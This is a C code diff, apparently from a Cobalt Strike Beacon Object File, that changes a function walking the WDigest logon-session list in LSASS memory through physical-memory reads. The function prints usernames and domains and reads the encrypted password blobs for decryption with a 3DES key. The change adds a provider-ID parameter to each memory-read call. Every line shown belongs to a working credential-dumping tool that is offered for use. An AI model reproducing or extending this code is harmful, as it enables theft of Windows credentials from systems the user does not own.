@@ -39,7 +39,7 @@ DWORD64 SearchForLogSessList(void)
 }
 
 
-BOOL DisplayWDigestLogSessListInformation(HANDLE hFile, DWORD64 l_LogSessListHead, DWORD lower32bits, DWORD LsassPID, unsigned char* Real3DesKey, int i3DesKeyLength, unsigned char* InitializationVector)
+BOOL DisplayWDigestLogSessListInformation(HANDLE hFile, DWORD64 l_LogSessListHead, DWORD lower32bits, DWORD LsassPID, unsigned char* Real3DesKey, int i3DesKeyLength, unsigned char* InitializationVector, int provId)
 {
     DWORD64 tmpPA = 0;
     DWORD64 kMSV1_0_LIST_63 = 0;
@@ -52,7 +52,7 @@ BOOL DisplayWDigestLogSessListInformation(HANDLE hFile, DWORD64 l_LogSessListHea
     {
         return FALSE;
     }
-    Flink = ReadAddressAtPhysicalAddressLocation(hFile, tmpPA);
+    Flink = ReadAddressAtPhysicalAddressLocation(hFile, tmpPA, provId);
 
 
     int i = 0;
@@ -65,7 +65,7 @@ BOOL DisplayWDigestLogSessListInformation(HANDLE hFile, DWORD64 l_LogSessListHea
         }
         BeaconFormatPrintf(&outputbuffer, "[%04d] Flink Base Address : 0x%llx\n", i, Flink);
 
-        wchar_t* UserNameWideString = ReadUnicodeStringFromPhysical(hFile, FlinkPA + 0x30, lower32bits, LsassPID);
+        wchar_t* UserNameWideString = ReadUnicodeStringFromPhysical(hFile, FlinkPA + 0x30, lower32bits, LsassPID, provId);
         if (UserNameWideString == NULL || *UserNameWideString == L'\0')
             UserNameWideString = L"(null)";
 
@@ -81,7 +81,7 @@ BOOL DisplayWDigestLogSessListInformation(HANDLE hFile, DWORD64 l_LogSessListHea
         }
 
 
-        wchar_t* DomainNameWideString = ReadUnicodeStringFromPhysical(hFile, FlinkPA + 0x40, lower32bits, LsassPID);
+        wchar_t* DomainNameWideString = ReadUnicodeStringFromPhysical(hFile, FlinkPA + 0x40, lower32bits, LsassPID, provId);
         if (DomainNameWideString == NULL || *DomainNameWideString == L'\0')
             DomainNameWideString = L"(null)";
 
@@ -96,11 +96,11 @@ BOOL DisplayWDigestLogSessListInformation(HANDLE hFile, DWORD64 l_LogSessListHea
             BeaconFormatPrintf(&outputbuffer, "\t    * Domain      : (Failed to convert to MultiByte string)\n");
         }
 
-        unsigned char* cryptoBlob = (unsigned char*)ReadUnicodeStringFromPhysical(hFile, FlinkPA + 0x50, lower32bits, LsassPID); // get the encrypted password
+        unsigned char* cryptoBlob = (unsigned char*)ReadUnicodeStringFromPhysical(hFile, FlinkPA + 0x50, lower32bits, LsassPID, provId); // get the encrypted password
 
         // since this is a UnicodeString struct and offset 0x2 contains the max length, we get 0x52 from 0x50 + 0x2
         BYTE MaxLengthOfString = 0;
-        ReadByte(hFile, FlinkPA + 0x52, &MaxLengthOfString);
+        ReadByte(hFile, FlinkPA + 0x52, &MaxLengthOfString, provId);
 
         if (MaxLengthOfString != 0)
         {
@@ -137,7 +137,7 @@ BOOL DisplayWDigestLogSessListInformation(HANDLE hFile, DWORD64 l_LogSessListHea
         
         BeaconFormatPrintf(&outputbuffer, "\n");
         TranslateUVA2Physical(Flink, &tmpPA, lower32bits, LsassPID);
-        Flink = ReadAddressAtPhysicalAddressLocation(hFile, tmpPA);
+        Flink = ReadAddressAtPhysicalAddressLocation(hFile, tmpPA, provId);
 
         i++;
 
